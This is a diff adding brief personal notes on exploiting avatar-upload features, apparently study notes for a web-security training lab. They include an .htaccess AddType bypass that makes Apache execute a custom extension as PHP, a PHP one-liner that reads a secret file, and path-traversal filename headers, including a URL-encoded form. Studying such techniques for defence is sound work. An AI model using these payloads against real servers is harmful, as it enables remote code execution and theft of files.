@@ -1,0 +1,28 @@
+happens when you can upload an avatar
+try classic bypasses
+if none work and the server is apache:
+
+
+    Change the value of the filename parameter to .htaccess.
+    Change the value of the Content-Type header to text/plain.
+
+    Replace the contents of the file (your PHP payload) with the following Apache directive:
+    AddType application/x-httpd-php .l33t
+
+    This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.
+
+
+USING FILE UPLOAD TO READ ARBITRARY FILES - path traversal
+
+sometimes the goal is not about code execution but getting information
+
+php file contents:
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+and these headers 
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+
+try this with URL encoding too
+filename="..%2fexploit.php"
+
+
